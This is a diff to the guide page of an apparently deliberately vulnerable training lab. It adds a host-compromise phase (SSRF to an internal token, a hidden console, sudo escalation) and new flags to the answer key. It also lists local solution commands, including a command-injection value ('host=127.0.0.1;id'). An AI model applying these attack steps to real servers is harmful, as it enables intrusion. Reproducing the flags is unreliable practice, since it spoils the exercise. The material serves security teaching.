@@ -225,15 +225,49 @@ VULNLAB_RESET=1 python app.py</pre>
   </section>
 
   <section class="guide-phase">
-    <h2>Phase 9 — Submission</h2>
-    <p><strong>Goal:</strong> Score 14/14 on the hidden form.</p>
+    <h2>Phase 9 — Host compromise</h2>
+    <p><strong>Goal:</strong> Get a shell on the server and escalate to root.</p>
     <ol>
-      <li>Collect every labeled value from the site.</li>
+      <li>Find documentation about the host environment (deployment notes, internal APIs).</li>
+      <li>Obtain the host console token from an internal-only endpoint.</li>
+      <li>Open the hidden system console and run commands as the web process user.</li>
+      <li>Read the user proof flag, then escalate privileges to read root's flag.</li>
+    </ol>
+    <p><strong>Done when:</strong> You have both host shell and host root flags.</p>
+
+    <details class="guide-hints">
+      <summary>Hints</summary>
+      <div class="guide-hint-body">
+        <details>
+          <summary>Deployment documentation</summary>
+          <p>Read <code>deployment_notes.txt</code> via the file viewer. It mentions the sysconsole and internal health check.</p>
+        </details>
+        <details>
+          <summary>Console token</summary>
+          <p>SSRF to <code>/internal/health</code> returns <code>host_console_token</code> and <code>host_console_url</code>.</p>
+        </details>
+        <details>
+          <summary>System console</summary>
+          <p>Visit <code>/sys/console?token=TOKEN</code> — blocked in <code>robots.txt</code>. Run <code>help</code>, then explore with <code>ls</code> and <code>cat</code>.</p>
+        </details>
+        <details>
+          <summary>Privilege escalation</summary>
+          <p>Read <code>home/www-data/notes.txt</code> on the console. www-data can run <code>sudo cat root/flag.txt</code> without a password.</p>
+        </details>
+      </div>
+    </details>
+  </section>
+
+  <section class="guide-phase">
+    <h2>Phase 10 — Submission</h2>
+    <p><strong>Goal:</strong> Score 16/16 on the hidden form.</p>
+    <ol>
+      <li>Collect every labeled value from the site and host.</li>
       <li>Find the submission form (not linked in navigation).</li>
       <li>Enter each value under its matching label.</li>
       <li>Submit <strong>Yes</strong> for Stored XSS if your payload ran.</li>
     </ol>
-    <p><strong>Done when:</strong> The form shows 14/14 complete.</p>
+    <p><strong>Done when:</strong> The form shows 16/16 complete.</p>
 
     <details class="guide-hints">
       <summary>Hints</summary>
@@ -265,7 +299,9 @@ LFI flag: VULN{l0cal_f1le_r3ad}
 Command injection flag: VULN{c0mm4nd_1nj3ct}
 SSRF flag: VULN{ssrf_1ntern4l}
 Backup config flag: VULN{b4ckup_expos3d}
-Password reset flag: VULN{w34k_r3s3t_t0k3n}</pre>
+Password reset flag: VULN{w34k_r3s3t_t0k3n}
+Host shell flag: VULN{sh3ll_4cc3ss}
+Host root flag: VULN{r00t_0n_b0x}</pre>
       </div>
     </details>
 
@@ -276,7 +312,11 @@ Password reset flag: VULN{w34k_r3s3t_t0k3n}</pre>
 curl -s http://127.0.0.1:5000/backup/config.bak
 curl -s http://127.0.0.1:5000/api/user/3
 curl -s "http://127.0.0.1:5000/files?name=backup_flag.txt"
+curl -s "http://127.0.0.1:5000/files?name=deployment_notes.txt"
 curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/internal/health"
+curl -s "http://127.0.0.1:5000/sys/console?token=c0ns0l3_t0k_8e1a4f"
+# on console: cat home/www-data/user_flag.txt
+# on console: sudo cat root/flag.txt
 curl -s -X POST http://127.0.0.1:5000/tools/ping -d "host=127.0.0.1;id"
 python3 -c "import base64; print(base64.urlsafe_b64encode(b'admin').decode().rstrip('='))"
 curl -s "http://127.0.0.1:5000/reset?user=admin&token=YWRtaW4"</pre>
